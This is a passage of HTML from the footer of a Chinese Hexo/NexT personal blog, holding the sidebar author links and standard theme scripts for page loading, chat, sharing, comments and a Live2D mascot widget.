class="site-state-item-name">标签</span></a></div></nav></div><div class="sidebar-button motion-element"><a onclick='Chatra("openChat",!0)'><i class="fa fa-comment"></i> Chat</a></div><div class="links-of-author motion-element"><span class="links-of-author-item"><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3Vlc3RjLXRveQ==" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;uestc-toy"><i class="fab fa-github fa-fw"></i>GitHub</span> </span><span class="links-of-author-item"><span class="exturl" data-url="bWFpbHRvOnRveW9rdXNhbmdAaG90bWFpbC5jb20=" title="E-Mail → mailto:toyokusang@hotmail.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</span></span></div><div class="cc-license motion-element" itemprop="license"><span class="exturl cc-opacity" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC8="><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></span></div></div><div class="back-to-top motion-element"><i class="fa fa-arrow-up"></i> <span>0%</span></div></div></aside><div id="sidebar-dimmer"></div></div></main><footer class="footer"><div class="footer-inner"><div class="copyright">&copy; <span itemprop="copyrightYear">2021</span> <span class="with-love"><i class="fa fa-heart"></i> </span><span class="author" itemprop="copyrightHolder">tosang</span> <span class="post-meta-divider">|</span> <span class="post-meta-item-icon"><i class="fa fa-chart-area"></i> </span><span title="站点总字数">141k</span> <span class="post-meta-divider">|</span> <span class="post-meta-item-icon"><i class="fa fa-coffee"></i> </span><span title="站点阅读时长">2:08</span></div><div class="powered-by">由 <span class="exturl theme-link" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & <span class="exturl theme-link" data-url="aHR0cHM6Ly90aGVtZS1uZXh0Lm9yZw==">NexT.Gemini</span> 强力驱动</div></div></footer></div><script src="/lib/anime.min.js"></script><script src="/lib/pjax/pjax.min.js"></script><script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script><script src="//cdn.jsdelivr.net/npm/lozad@1/dist/lozad.min.js"></script><script src="/lib/velocity/velocity.min.js"></script><script src="/lib/velocity/velocity.ui.min.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/pisces.js"></script><script src="/js/next-boot.js"></script><script src="/js/bookmark.js"></script><script>var pjax = new Pjax({
  selectors: [
    'head title',
    '#page-configurations',
    '.content-wrap',
    '.post-toc-wrap',
    '.languages',
    '#pjax'
  ],
  switches: {
    '.post-toc-wrap': Pjax.switches.innerHTML
  },
  analytics: false,
  cacheBust: false,
  scrollTo : !CONFIG.bookmark.enable
});

window.addEventListener('pjax:success', () => {
  document.querySelectorAll('script[data-pjax], script#page-configurations, #pjax script').forEach(element => {
    var code = element.text || element.textContent || element.innerHTML || '';
    var parent = element.parentNode;
    parent.removeChild(element);
    var script = document.createElement('script');
    if (element.id) {
      script.id = element.id;
    }
    if (element.className) {
      script.className = element.className;
    }
    if (element.type) {
      script.type = element.type;
    }
    if (element.src) {
      script.src = element.src;
      // Force synchronous loading of peripheral JS.
      script.async = false;
    }
    if (element.dataset.pjax !== undefined) {
      script.dataset.pjax = '';
    }
    if (code !== '') {
      script.appendChild(document.createTextNode(code));
    }
    parent.appendChild(script);
  });
  NexT.boot.refresh();
  // Define Motion Sequence & Bootstrap Motion.
  if (CONFIG.motion.enable) {
    NexT.motion.integrator
      .init()
      .add(NexT.motion.middleWares.subMenu)
      .add(NexT.motion.middleWares.postList)
      .bootstrap();
  }
  NexT.utils.updateSidebarPosition();
});</script><script data-pjax>!function(){var t=document.createElement("script"),e=window.location.protocol.split(":")[0];t.src="https"===e?"https://zz.bdstatic.com/linksubmit/push.js":"http://push.zhanzhang.baidu.com/push.js";var s=document.getElementsByTagName("script")[0];s.parentNode.insertBefore(t,s)}()</script><script src="/js/local-search.js"></script><script>!function(a,t,n){t.ChatraID="WeqmpGNhkLxAnnuqz";var c=a.createElement("script");t[n]=t[n]||function(){(t[n].q=t[n].q||[]).push(arguments)},c.async=!1,c.src="https://call.chatra.io/chatra.js",a.head&&a.head.appendChild(c)}(document,window,"Chatra")</script><div id="pjax"><div id="needsharebutton-float"><span class="btn"><i class="fa fa-share-alt" aria-hidden="true"></i></span></div><script src="//cdn.jsdelivr.net/gh/theme-next/theme-next-needmoreshare2@1/needsharebutton.min.js"></script><script>pbOptions={iconStyle:"box",boxForm:"horizontal",position:"bottomCenter",networks:"Weibo,Wechat,Douban,QQZone"},new needShareButton("#needsharebutton-postbottom",pbOptions),flOptions={iconStyle:"box",boxForm:"horizontal",position:"middleRight",networks:"Weibo,Wechat,Douban,QQZone"},new needShareButton("#needsharebutton-float",flOptions)</script><script>NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
  NexT.utils.getScript('//unpkg.com/valine/dist/Valine.min.js', () => {
    var GUEST = ['nick', 'mail', 'link'];
    var guest = '昵称,邮箱,链接';
    guest = guest.split(',').filter(item => {
      return GUEST.includes(item);
    });
    new Valine({
      el         : '#valine-comments',
      verify     : true,
      notify     : false,
      appId      : 'cEWy5xlMxSYtWw1jc0vQSgr9-gzGzoHsz',
      appKey     : 'zR4PkPOIJ7DAgbKG7IoJDRS8',
      placeholder: "请发表你的评论",
      avatar     : 'mm',
      meta       : guest,
      pageSize   : '10' || 10,
      visitor    : true,
      lang       : 'zh-cn' || 'zh-cn',
      path       : location.pathname,
      recordIP   : true,
      serverURLs : ''
    });
  }, window.Valine);
});</script></div><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/wanko.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"react":{"opacity":0.7}});</script></body></html>